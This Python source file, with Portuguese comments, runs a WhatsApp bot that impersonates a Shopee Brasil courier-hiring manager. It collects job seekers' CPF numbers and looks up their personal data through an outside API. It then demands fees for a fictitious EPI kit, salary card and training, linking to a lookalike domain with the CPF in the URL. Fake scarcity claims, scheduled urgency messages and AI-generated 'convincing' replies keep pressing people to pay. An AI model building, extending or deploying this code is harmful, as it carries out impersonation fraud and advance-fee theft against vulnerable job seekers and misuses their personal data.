#!/usr/bin/env python3
"""
Sistema de Automação de Conversas
Gerencia fluxos automáticos de resposta baseado no contexto da conversa
"""
import logging
import re
import requests
import json
import threading
import time
from typing import Dict, Any, Optional, Tuple
from datetime import datetime, timedelta

class ConversationAutomation:
    """Automação inteligente de conversas WhatsApp"""
    
    def __init__(self, whatsapp_api, db, phone_number_id=None):
        self.whatsapp_api = whatsapp_api
        self.db = db
        self.phone_number_id = phone_number_id
        
        # Configurar phone_number_id na API se fornecido
        if phone_number_id:
            self.whatsapp_api.set_phone_number_id(phone_number_id)
        
    def should_trigger_automation(self, phone_number: str, conversation_id: int) -> bool:
        """Verifica se deve disparar automação para esta conversa"""
        try:
            from models import ChatMessage, ConversationState
            
            # Verificar estado persistente
            normalized_phone = self._normalize_phone(phone_number)
            conv_state = ConversationState.query.filter_by(phone_number=normalized_phone).first()
            
            # Se já tem estado, sempre processar
            if conv_state:
                return True
            
            # Senão, verificar se é primeira mensagem
            client_messages = ChatMessage.query.filter_by(
                conversation_id=conversation_id,
                direction='inbound'
            ).count()
            
            if client_messages == 1:
                logging.info(f"🤖 PRIMEIRA MENSAGEM detectada de {phone_number} - INICIANDO AUTOMAÇÃO")
                return True
                
            return False
            
        except Exception as e:
            logging.error(f"Erro ao verificar automação: {str(e)}")
            return False
    
    def process_automation(self, phone_number: str, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
        """Processa automação baseada no estado da conversa"""
        try:
            from models import ConversationState
            
            # Normalizar número e buscar estado persistente
            normalized_phone = self._normalize_phone(phone_number)
            conv_state = ConversationState.get_or_create(normalized_phone)
            current_state = conv_state.current_state
            
            logging.info(f"🤖 Processando automação - Estado: {current_state} - Mensagem: {message_content[:50]}")
            
            if current_state == 'initial':
                return self._handle_initial_contact(conv_state, conversation_id, phone_number_id)
            elif current_state == 'waiting_cpf':
                return self._handle_cpf_input(conv_state, conversation_id, message_content, phone_number_id)
            elif current_state == 'confirming_name':
                return self._handle_name_confirmation(conv_state, conversation_id, message_content, phone_number_id)
            elif current_state == 'pending_questions':
                return self._handle_pending_questions(conv_state, conversation_id, message_content, phone_number_id)
            
            return False
            
        except Exception as e:
            logging.error(f"Erro na automação: {str(e)}")
            return False
    
    def _handle_initial_contact(self, conv_state, conversation_id: int, phone_number_id: str) -> bool:
        """Resposta inicial - apresentar como gerente da Shopee"""
        try:
            message = (
                "Olá! Sou Zilma Alencar, Gerente de Contratação de Entregadores da Shopee Brasil.\n\n"
                "Estou aqui para ajudar você a finalizar seu cadastro de Entregador da Shopee.\n\n"
                "Para prosseguir, preciso validar seus dados.\n"
                "Por favor, digite seu CPF (apenas números, sem pontos ou traços):"
            )
            
            # Enviar mensagem
            success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, message)
            
            if success:
                # Atualizar estado persistente
                conv_state.update_state('waiting_cpf')
                
                # Salvar mensagem enviada no banco
                self._save_outbound_message(conversation_id, message, result.get('messageId'))
                
                logging.info(f"✅ Mensagem inicial enviada para {conv_state.phone_number}")
                return True
            else:
                logging.error(f"❌ Falha ao enviar mensagem inicial: {result}")
                return False
                
        except Exception as e:
            logging.error(f"Erro na resposta inicial: {str(e)}")
            return False
    
    def _handle_cpf_input(self, conv_state, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
        """Processar CPF digitado pelo usuário"""
        try:
            # Extrair CPF da mensagem
            cpf = self._extract_cpf(message_content)
            
            if not cpf:
                # CPF inválido - pedir novamente
                error_message = (
                    "❌ CPF inválido ou não reconhecido.\n\n"
                    "📄 Por favor, digite apenas os números do seu CPF (11 dígitos):\n"
                    "Exemplo: 12345678901\n\n"
                    "⚠️ Certifique-se de que o CPF está correto (com dígitos verificadores válidos)"
                )
                
                success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, error_message)
                if success:
                    self._save_outbound_message(conversation_id, error_message, result.get('messageId'))
                
                return True
            
            # CPF válido - enviar mensagem de aguarde
            cpf_masked = f"***.***.*{cpf[8:9]}*-**"  # Mascarar quase todo o CPF nos logs
            logging.info(f"🔍 Buscando dados para CPF {cpf_masked}")
            
            wait_message = (
                "⏳ Aguarde um momento...\n"
                "🔍 Estou buscando seu cadastro no sistema Shopee..."
            )
            
            success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, wait_message)
            if success:
                self._save_outbound_message(conversation_id, wait_message, result.get('messageId'))
            
            # Buscar dados na API
            client_data = self._fetch_client_data(cpf)
            
            if client_data and client_data.get('sucesso'):
                # Cliente encontrado - verificar status
                cliente = client_data.get('cliente', {})
                ultima_transacao = client_data.get('ultima_transacao', {})
                nome = cliente.get('nome', 'Nome não informado')
                status = ultima_transacao.get('status', 'UNKNOWN')
                
                # Salvar dados do cliente no estado persistente
                import json
                conv_state.cpf_status = status
                conv_state.original_cpf = cpf
                conv_state.update_state('confirming_name', json.dumps(client_data))
                
                logging.info(f"🔍 CPF {cpf_masked} - Status: {status}")
                
                # Fluxo condicional baseado no status
                if status == 'APPROVED':
                    # Fluxo original - confirmar nome
                    return self._send_name_confirmation(conv_state, conversation_id, nome, phone_number_id)
                elif status == 'PENDING':
                    # Novo fluxo PENDING - pular confirmação e ir direto para fluxo especial
                    return self._handle_pending_flow(conv_state, conversation_id, nome, phone_number_id)
                else:
                    # Status desconhecido - usar fluxo padrão
                    return self._send_name_confirmation(conv_state, conversation_id, nome, phone_number_id)
            else:
                # Cliente não encontrado
                not_found_message = (
                    "❌ CPF não encontrado no sistema Shopee.\n\n"
                    "🤔 Verifique se:\n"
                    "• O CPF está correto e válido\n"
                    "• Você já fez algum pedido na Shopee\n\n"
                    "📄 Tente novamente ou digite seu CPF correto:"
                )
                
                success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, not_found_message)
                if success:
                    self._save_outbound_message(conversation_id, not_found_message, result.get('messageId'))
                
                return True
                
        except Exception as e:
            logging.error(f"Erro ao processar CPF: {str(e)}")
            return False
    
    def _send_name_confirmation(self, conv_state, conversation_id: int, nome: str, phone_number_id: str) -> bool:
        """Enviar confirmação de nome com botões interativos do WhatsApp"""
        try:
            # Mensagem de confirmação
            confirmation_message = (
                f"✅ Cadastro encontrado!\n\n"
                f"👤 Nome: **{nome}**\n\n"
                f"🤔 Este é o seu nome correto?"
            )
            
            # Tentar enviar com botões interativos do WhatsApp
            buttons = [
                {
                    'type': 'reply',
                    'reply': {
                        'id': 'confirm_name_yes',
                        'title': '✅ SIM'
                    }
                },
                {
                    'type': 'reply', 
                    'reply': {
                        'id': 'confirm_name_no',
                        'title': '❌ NÃO'
                    }
                }
            ]
            
            # Enviar mensagem com botões interativos
            success, result = self._send_interactive_buttons(conv_state.phone_number, confirmation_message, buttons)
            
            if success:
                self._save_outbound_message(conversation_id, confirmation_message + " [Com botões interativos]", result.get('messageId'))
                logging.info(f"✅ Confirmação de nome com botões enviada para {conv_state.phone_number}: {nome[:20]}...")
                return True
            else:
                # Fallback para mensagem de texto simples
                logging.warning("Botões interativos falharam, usando fallback de texto")
                buttons_message = (
                    confirmation_message + "\n\n"
                    "👆 Confirme se o nome acima está correto:\n\n"
                    "1️⃣ Digite **SIM** se está correto\n"
                    "2️⃣ Digite **NAO** se está incorreto"
                )
                
                success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, buttons_message)
                if success:
                    self._save_outbound_message(conversation_id, buttons_message, result.get('messageId'))
                    return True
            
            return False
            
        except Exception as e:
            logging.error(f"Erro ao enviar confirmação: {str(e)}")
            return False
    
    def _send_interactive_buttons(self, phone_number: str, message: str, buttons: list) -> Tuple[bool, Dict]:
        """Enviar mensagem com botões interativos do WhatsApp"""
        try:
            # Montar payload para botões interativos
            payload = {
                'messaging_product': 'whatsapp',
                'to': phone_number,
                'type': 'interactive',
                'interactive': {
                    'type': 'button',
                    'body': {
                        'text': message
                    },
                    'action': {
                        'buttons': buttons
                    }
                }
            }
            
            # Usar API do WhatsApp para enviar
            url = f"{self.whatsapp_api.base_url}/{self.whatsapp_api.phone_number_id}/messages"
            
            # Enviar via pipeline de proxy
            response = self.whatsapp_api._send_via_proxy_only(url, payload, self.whatsapp_api.phone_number_id)
            
            if response.status_code == 200:
                data = response.json()
                return True, {
                    'messageId': data.get('messages', [{}])[0].get('id', ''),
                    'status': 'sent'
                }
            else:
                logging.error(f"Erro ao enviar botões interativos: {response.status_code} - {response.text}")
                return False, {'error': f'HTTP {response.status_code}'}
                
        except Exception as e:
            logging.error(f"Erro na função de botões interativos: {str(e)}")
            return False, {'error': str(e)}
    
    def _handle_name_confirmation(self, conv_state, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
        """Processar resposta de confirmação de nome"""
        try:
            content_lower = message_content.lower().strip()
            
            # Detectar resposta (texto ou botão interativo)
            if content_lower in ['sim', 'yes', 's', '1', 'confirm_name_yes', '✅ sim']:
                # Nome confirmado - extrair primeiro nome dos dados salvos
                import json
                client_data = json.loads(conv_state.client_data) if conv_state.client_data else {}
                
                # Extrair nome do campo cliente.nome
                cliente_info = client_data.get('cliente', {})
                full_name = cliente_info.get('nome', 'Usuário')
                first_name = full_name.split()[0] if full_name and full_name != 'Usuário' else 'Usuário'
                
                # Primeira mensagem: Confirmação e explicação sobre Kit EPI e Cartão salário
                first_message = (
                    f"Perfeito {first_name}! Nome confirmado.\n\n"
                    f"📦 Informação importante {first_name}:\n\n"
                    "O Kit EPI e o Cartão salário da Shopee ainda não foram enviados porque para serem enviados é obrigatório que o entregador se inscreva no treinamento de entregadores da Shopee para que não ocorram nenhum tipo de erro nas entregas."
                )
                
                # Enviar primeira mensagem
                success1, result1 = self.whatsapp_api.send_text_message(conv_state.phone_number, first_message)
                if success1:
                    self._save_outbound_message(conversation_id, first_message, result1.get('messageId'))
                    
                    # Segunda mensagem: Botão para finalizar cadastro
                    second_message = (
                        "Para finalizar o cadastro e começar a realizar as entregas está faltando apenas iniciar o treinamento de entregadores da Shopee.\n\n"
                        "⚠️ *IMPORTANTE:* Após realizar o pagamento do honorário do professor, envie o comprovante de pagamento para mim para que eu possa adiantar seu cadastro e acelerar o processo de contratação.\n\n"
                        "Clique no botão abaixo para se matricular no treinamento:"
                    )
                    
                    # Enviar mensagem com botão CTA
                    success2, result2 = self.whatsapp_api.send_interactive_cta_url_message(
                        conv_state.phone_number, 
                        second_message,
                        "Finalizar Cadastro",
                        "https://shopee.acesso.inc/treinamento"
                    )
                    
                    if success2:
                        self._save_outbound_message(conversation_id, second_message + "\n[Botão: Finalizar Cadastro]", result2.get('messageId'))
                        
                        # Agendar mensagem de urgência para 3 minutos depois (sistema persistente)
                        from models import ScheduledMessage
                        ScheduledMessage.schedule_urgency_message(
                            conv_state.phone_number, 
                            conversation_id, 
                            first_name,
                            self.whatsapp_api.phone_number_id,
                            delay_minutes=3
                        )
                        
                        # Limpar estado da automação
                        conv_state.clear_state()
                        logging.info(f"✅ Automação concluída com sucesso para {conv_state.phone_number}")
                        return True
                    else:
                        logging.error(f"❌ Falha ao enviar segunda mensagem: {result2}")
                        return False
                else:
                    logging.error(f"❌ Falha ao enviar primeira mensagem: {result1}")
                    return False
                
            elif content_lower in ['nao', 'não', 'no', 'n', '2', 'confirm_name_no', '❌ nao']:
                # Nome não confirmado
                error_message = (
                    "Nome não confirmado.\n\n"
                    "Vamos tentar novamente.\n"
                    "Digite seu CPF correto (apenas números):"
                )
                
                # Voltar ao estado de espera de CPF
                conv_state.update_state('waiting_cpf')
                
                success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, error_message)
                if success:
                    self._save_outbound_message(conversation_id, error_message, result.get('messageId'))
                
                return True
            else:
                # Resposta não reconhecida
                help_message = (
                    "Não entendi sua resposta.\n\n"
                    "Por favor, escolha uma opção:\n"
                    "Digite SIM se o nome está correto\n"
                    "Digite NAO se o nome está incorreto"
                )
                
                success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, help_message)
                if success:
                    self._save_outbound_message(conversation_id, help_message, result.get('messageId'))
                
                return True
                
        except Exception as e:
            logging.error(f"Erro na confirmação de nome: {str(e)}")
            return False
    
    def _extract_cpf(self, message: str) -> Optional[str]:
        """Extrair e validar CPF da mensagem (com checksum mod 11)"""
        try:
            # Remover tudo que não é número
            numbers_only = re.sub(r'\D', '', message)
            
            # Verificar se tem 11 dígitos
            if len(numbers_only) != 11:
                return None
            
            # Validar checksum mod 11
            if self._validate_cpf_checksum(numbers_only):
                return numbers_only
            
            return None
            
        except Exception as e:
            logging.error(f"Erro ao extrair CPF: {str(e)}")
            return None
    
    def _validate_cpf_checksum(self, cpf: str) -> bool:
        """Validar checksum do CPF usando mod 11"""
        try:
            # CPFs inválidos conhecidos
            if cpf in ['00000000000', '11111111111', '22222222222', '33333333333', 
                      '44444444444', '55555555555', '66666666666', '77777777777',
                      '88888888888', '99999999999']:
                return False
            
            # Calcular primeiro dígito verificador
            soma = sum(int(cpf[i]) * (10 - i) for i in range(9))
            resto = soma % 11
            digito1 = 0 if resto < 2 else 11 - resto
            
            # Calcular segundo dígito verificador
            soma = sum(int(cpf[i]) * (11 - i) for i in range(10))
            resto = soma % 11
            digito2 = 0 if resto < 2 else 11 - resto
            
            # Verificar se os dígitos conferem
            return cpf[9] == str(digito1) and cpf[10] == str(digito2)
            
        except Exception as e:
            logging.error(f"Erro na validação do CPF: {str(e)}")
            return False
    
    def _fetch_client_data(self, cpf: str) -> Optional[Dict]:
        """Buscar dados do cliente na API externa"""
        try:
            api_url = f"https://recoveryfy.replit.app/api/v1/cliente/cpf/{cpf}"
            
            # Mascarar CPF para logs (mostrar apenas primeiros 3 e últimos 2 dígitos)
            cpf_masked = f"{cpf[:3]}.***.***-{cpf[-2:]}" if len(cpf) >= 5 else "***.***.***-**"
            logging.info(f"🔍 Buscando CPF {cpf_masked} na API")
            
            response = requests.get(api_url, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                logging.info(f"✅ API response: {data}")
                return data
            else:
                logging.warning(f"❌ API retornou status {response.status_code}")
                return None
                
        except Exception as e:
            logging.error(f"Erro ao buscar dados na API: {str(e)}")
            return None
    
    def _save_outbound_message(self, conversation_id: int, content: str, whatsapp_message_id: str = None):
        """Salvar mensagem enviada no banco"""
        try:
            from app import app
            from models import ChatMessage
            
            # Usar contexto da aplicação para evitar conflitos de sessão
            with app.app_context():
                message = ChatMessage.create_outbound(
                    conversation_id=conversation_id,
                    content=content
                )
                
                if whatsapp_message_id:
                    message.update_status('sent', whatsapp_message_id)
            
        except Exception as e:
            logging.error(f"Erro ao salvar mensagem outbound: {str(e)}")
    
    def _normalize_phone(self, phone: str) -> str:
        """Normalizar número de telefone"""
        if not phone:
            return phone
        
        # Remove + e espaços
        phone = phone.replace('+', '').replace(' ', '').replace('-', '')
        
        # Garantir que tem 13 dígitos (55 + 11 dígitos)
        if len(phone) == 11 and not phone.startswith('55'):
            phone = '55' + phone
        
        return phone
    
    @staticmethod
    def _save_active_token(token: str):
        """Salvar token ativo no cache compartilhado"""
        try:
            import tempfile
            import os
            cache_file = os.path.join(tempfile.gettempdir(), "whatsapp_active_token.txt")
            with open(cache_file, 'w') as f:
                f.write(token)
        except Exception as e:
            logging.warning(f"Falha ao salvar token ativo: {e}")
    
    @staticmethod
    def _load_active_token() -> str:
        """Carregar token ativo do cache compartilhado"""
        try:
            import tempfile
            cache_file = os.path.join(tempfile.gettempdir(), "whatsapp_active_token.txt")
            if os.path.exists(cache_file):
                with open(cache_file, 'r') as f:
                    return f.read().strip()
        except Exception as e:
            logging.warning(f"Falha ao carregar token ativo: {e}")
        return None
    
    @staticmethod
    def process_scheduled_messages():
        """Processar mensagens agendadas pendentes - executar periodicamente"""
        try:
            from models import ScheduledMessage
            from services.whatsapp_business_api import WhatsAppBusinessAPI
            from app import app
            
            with app.app_context():
                # Buscar e reivindicar mensagens pendentes atomicamente
                pending_messages = ScheduledMessage.get_and_claim_pending_messages()
                
                if not pending_messages:
                    return
                
                logging.info(f"📋 Processando {len(pending_messages)} mensagens agendadas...")
                
                # Usar o mesmo WhatsApp API service já configurado na interface
                from app import whatsapp_service
                whatsapp_api = whatsapp_service
                
                logging.info(f"🔑 Scheduler usando token da interface: ...{whatsapp_api._access_token[-5:] if whatsapp_api._access_token else 'N/A'}")
                
                for scheduled_msg in pending_messages:
                    try:
                        # Configurar phone_number_id correto para a mensagem
                        whatsapp_api.set_phone_number_id(scheduled_msg.whatsapp_phone_id)
                        
                        # Enviar mensagem
                        success, result = whatsapp_api.send_text_message(
                            scheduled_msg.phone_number, 
                            scheduled_msg.message_content
                        )
                        
                        if success:
                            # Marcar como enviada
                            message_id = result.get('messageId', 'N/A')
                            scheduled_msg.mark_as_sent(message_id)
                            
                            # Salvar na conversa também
                            automation = ConversationAutomation(whatsapp_api, None)
                            automation._save_outbound_message(
                                scheduled_msg.conversation_id, 
                                scheduled_msg.message_content, 
                                message_id
                            )
                            
                            logging.info(f"✅ Mensagem agendada enviada para {scheduled_msg.phone_number}")
                        else:
                            # Marcar como falha
                            error_msg = str(result)
                            scheduled_msg.mark_as_failed(error_msg)
                            logging.error(f"❌ Falha ao enviar mensagem agendada para {scheduled_msg.phone_number}: {error_msg}")
                            
                    except Exception as e:
                        # Marcar como falha
                        scheduled_msg.mark_as_failed(str(e))
                        logging.error(f"Erro ao processar mensagem agendada para {scheduled_msg.phone_number}: {str(e)}")
                
        except Exception as e:
            logging.error(f"Erro no processamento de mensagens agendadas: {str(e)}")
    
    def _handle_pending_flow(self, conv_state, conversation_id: int, nome: str, phone_number_id: str) -> bool:
        """Novo fluxo para usuários com status PENDING - Kit EPI não pago"""
        try:
            # Primeira mensagem personalizada com nome da API
            first_message = (
                f"Olá {nome}! ✅\n\n"
                f"Seu cadastro como entregador foi aprovado com sucesso! 🎉\n\n"
                f"Porém, vi no sistema que você ainda não adquiriu o *Kit obrigatório de EPI* "
                f"e nem pagou a *taxa de entrega do Cartão salário*. 📦💳"
            )
            
            # Enviar primeira mensagem
            success1, result1 = self.whatsapp_api.send_text_message(conv_state.phone_number, first_message)
            if success1:
                self._save_outbound_message(conversation_id, first_message, result1.get('messageId'))
                
                # Segunda mensagem com urgência e botões
                second_message = (
                    f"⚠️ *URGENTE {nome}!*\n\n"
                    f"🔥 As vagas para entregador Shopee na sua região estão acabando!\n\n"
                    f"📊 Restam apenas *2 vagas disponíveis*!\n\n"
                    f"🤔 Você ficou com alguma dúvida sobre o processo?"
                )
                
                # Botões Sim/Não
                buttons = [
                    {
                        'type': 'reply',
                        'reply': {
                            'id': 'pending_doubt_yes',
                            'title': '✅ SIM - Tenho dúvidas'
                        }
                    },
                    {
                        'type': 'reply', 
                        'reply': {
                            'id': 'pending_doubt_no',
                            'title': '❌ NÃO - Sem dúvidas'
                        }
                    }
                ]
                
                # Enviar mensagem com botões
                success2, result2 = self._send_interactive_buttons(conv_state.phone_number, second_message, buttons)
                
                if success2:
                    self._save_outbound_message(conversation_id, second_message + " [Com botões: SIM/NÃO]", result2.get('messageId'))
                    
                    # Atualizar estado para aguardar resposta dos botões
                    conv_state.update_state('pending_questions')
                    logging.info(f"✅ Fluxo PENDING iniciado para {conv_state.phone_number}: {nome[:20]}...")
                    return True
                else:
                    # Fallback para texto simples
                    fallback_message = (
                        second_message + "\n\n"
                        "👆 Responda:\n"
                        "1️⃣ Digite *SIM* se tem dúvidas\n"
                        "2️⃣ Digite *NAO* se não tem dúvidas"
                    )
                    
                    success3, result3 = self.whatsapp_api.send_text_message(conv_state.phone_number, fallback_message)
                    if success3:
                        self._save_outbound_message(conversation_id, fallback_message, result3.get('messageId'))
                        conv_state.update_state('pending_questions')
                        return True
            
            return False
            
        except Exception as e:
            logging.error(f"Erro no fluxo PENDING: {str(e)}")
            return False
    
    def _handle_pending_questions(self, conv_state, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
        """Processar respostas do fluxo PENDING (botões SIM/NÃO ou perguntas OpenAI)"""
        try:
            content_lower = message_content.lower().strip()
            
            # Se é resposta aos botões SIM/NÃO iniciais
            if content_lower in ['sim', 'yes', 's', '1', 'pending_doubt_yes', '✅ sim - tenho dúvidas', 'tenho dúvidas']:
                # Usuário tem dúvidas - ativar OpenAI
                question_message = (
                    "Perfeito! 💭\n\n"
                    "Pode me escrever ou enviar um áudio com sua dúvida.\n\n"
                    "Estou aqui para esclarecer tudo sobre ser entregador da Shopee! 😊"
                )
                
                success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, question_message)
                if success:
                    self._save_outbound_message(conversation_id, question_message, result.get('messageId'))
                    # Manter no mesmo estado para receber a pergunta
                    return True
                
            elif content_lower in ['nao', 'não', 'no', 'n', '2', 'pending_doubt_no', '❌ nao - sem dúvidas', 'sem dúvidas']:
                # Usuário não tem dúvidas - ir direto para pagamento
                return self._send_pending_payment_link(conv_state, conversation_id, phone_number_id)
                
            else:
                # É uma pergunta do usuário - processar com OpenAI
                return self._process_openai_question(conv_state, conversation_id, message_content, phone_number_id)
            
            return False
            
        except Exception as e:
            logging.error(f"Erro ao processar perguntas PENDING: {str(e)}")
            return False
    
    def _process_openai_question(self, conv_state, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
        """Processar pergunta do usuário usando OpenAI (texto ou áudio)"""
        try:
            from openai_service import ShopeeDeliveryAssistant
            from models import ChatMessage
            
            # Incrementar contador de perguntas
            conv_state.question_count = (conv_state.question_count or 0) + 1
            
            logging.info(f"🤖 Processando pergunta #{conv_state.question_count} via OpenAI para {conv_state.phone_number}")
            
            # Buscar a última mensagem para verificar se é áudio
            last_message = ChatMessage.query.filter_by(
                conversation_id=conversation_id,
                direction='inbound'
            ).order_by(ChatMessage.created_at.desc()).first()
            
            ai_response = None
            
            # Verificar se é mensagem de áudio/voz
            if last_message and last_message.message_type in ['audio', 'voice'] and last_message.media_url:
                logging.info(f"🎵 Processando áudio via OpenAI: {last_message.media_url}")
                
                # Obter URL de download da mídia e transcrever + responder
                media_download_url = self._get_media_download_url(last_message.media_url, phone_number_id)
                if media_download_url:
                    ai_response = ShopeeDeliveryAssistant.get_response_from_audio(
                        media_download_url,
                        self.whatsapp_api._access_token,
                        []  # conversation_history simplificado
                    )
                else:
                    ai_response = "Desculpe, não consegui processar o áudio. Pode me escrever sua dúvida?"
            else:
                # Processar como texto normal
                ai_response = ShopeeDeliveryAssistant.get_response(message_content, [])
            
            # Enviar resposta da IA
            success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, ai_response)
            if success:
                self._save_outbound_message(conversation_id, f"🤖 IA: {ai_response}", result.get('messageId'))
                
                # Incrementar contador APENAS após envio bem-sucedido
                conv_state.question_count += 1
                self.db.session.commit()
                
                # Verificar se deve finalizar (após 10 tentativas TOTAL OU se usuário demonstrou interesse)
                # Buscar histórico recente para detecção de interesse
                from models import ChatMessage
                recent_messages = self.db.session.query(ChatMessage)\
                    .filter_by(conversation_id=conversation_id, direction='inbound')\
                    .order_by(ChatMessage.created_at.desc())\
                    .limit(3).all()
                conversation_history = [{"role": "user", "content": msg.content} for msg in reversed(recent_messages)]
                
                if conv_state.question_count >= 10 or ShopeeDeliveryAssistant.should_finalize_payment(conversation_history, conv_state.question_count):
                    # Dar uma pausa antes de enviar o link
                    import time
                    time.sleep(2)
                    
                    return self._send_pending_payment_link(conv_state, conversation_id, phone_number_id)
                
                # Entre as tentativas 6-10: usar mensagens de convencimento ao invés de responder perguntas
                elif conv_state.question_count >= 5:
                    # A partir da 6ª tentativa, usar mensagens pré-definidas de convencimento
                    from openai_service import ShopeeDeliveryAssistant
                    conversion_message = ShopeeDeliveryAssistant.get_conversion_message(conv_state.question_count)
                    
                    # Enviar mensagem de convencimento
                    success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, conversion_message)
                    if success:
                        # Incrementar contador APENAS após envio bem-sucedido
                        conv_state.question_count += 1
                        self.db.session.commit()
                        
                        self._save_outbound_message(conversation_id, f"🎯 Convencimento: {conversion_message}", result.get('messageId'))
                        return True
                    
                    return False
                
                # Continuar no mesmo estado para mais perguntas
                return True
            
            return False
            
        except Exception as e:
            logging.error(f"Erro na OpenAI: {str(e)}")
            # Resposta de fallback
            fallback_response = (
                "Entendo sua dúvida! 😊\n\n"
                "O importante é finalizar seu cadastro hoje mesmo. "
                "As vagas estão se esgotando rapidamente! ⏰"
            )
            
            success, result = self.whatsapp_api.send_text_message(conv_state.phone_number, fallback_response)
            if success:
                self._save_outbound_message(conversation_id, fallback_response, result.get('messageId'))
                return self._send_pending_payment_link(conv_state, conversation_id, phone_number_id)
            
            return False
    
    def _send_pending_payment_link(self, conv_state, conversation_id: int, phone_number_id: str) -> bool:
        """Enviar link de pagamento personalizado para fluxo PENDING"""
        try:
            # Extrair primeiro nome
            import json
            client_data = json.loads(conv_state.client_data) if conv_state.client_data else {}
            cliente_info = client_data.get('cliente', {})
            full_name = cliente_info.get('nome', 'Usuário')
            first_name = full_name.split()[0] if full_name and full_name != 'Usuário' else 'Usuário'
            
            # Criar link personalizado usando CPF original sem pontuação
            cpf_clean = conv_state.original_cpf  # CPF já está sem pontuação
            payment_link = f"https://shopee.acesso.inc/{cpf_clean}"
            
            # Mensagem final com link de pagamento
            final_message = (
                f"Perfeito {first_name}! 🚀\n\n"
                f"Para finalizar seu cadastro e garantir sua vaga, basta clicar no botão abaixo "
                f"e realizar o pagamento do Kit EPI e taxa do Cartão Salário.\n\n"
                f"⚠️ *URGENTE:* Restam apenas 2 vagas na sua região!"
            )
            
            # Enviar mensagem com botão de pagamento
            success, result = self.whatsapp_api.send_interactive_cta_url_message(
                conv_state.phone_number,
                final_message,
                "Finalizar Cadastro Agora",
                payment_link
            )
            
            if success:
                self._save_outbound_message(conversation_id, final_message + f"\n[Botão: Finalizar Cadastro - {payment_link}]", result.get('messageId'))
                
                # Limpar estado da automação
                conv_state.clear_state()
                logging.info(f"✅ Fluxo PENDING concluído para {conv_state.phone_number} - Link: {payment_link}")
                return True
            
            return False
            
        except Exception as e:
            logging.error(f"Erro ao enviar link de pagamento PENDING: {str(e)}")
            return False
    
    def _get_media_download_url(self, media_id: str, phone_number_id: str) -> Optional[str]:
        """Obter URL de download para mídia do WhatsApp usando media_id"""
        try:
            import requests
            
            # URL correta da API do WhatsApp para obter informações da mídia
            media_info_url = f"https://graph.facebook.com/v23.0/{media_id}"
            
            headers = {
                'Authorization': f'Bearer {self.whatsapp_api._access_token}',
                'User-Agent': 'WhatsApp-Business-Python-Client'
            }
            
            # Buscar informações da mídia
            response = requests.get(media_info_url, headers=headers, timeout=15)
            
            if response.status_code == 200:
                media_info = response.json()
                download_url = media_info.get('url')
                
                if download_url:
                    logging.info(f"🎵 URL de download obtida para mídia {media_id}: {download_url[:50]}...")
                    return download_url
                else:
                    logging.error(f"URL não encontrada na resposta da mídia {media_id}")
                    return None
            else:
                logging.error(f"Erro ao obter URL da mídia {media_id}: {response.status_code} - {response.text}")
                return None
                
        except Exception as e:
            logging.error(f"Erro ao processar mídia {media_id}: {str(e)}")
            return None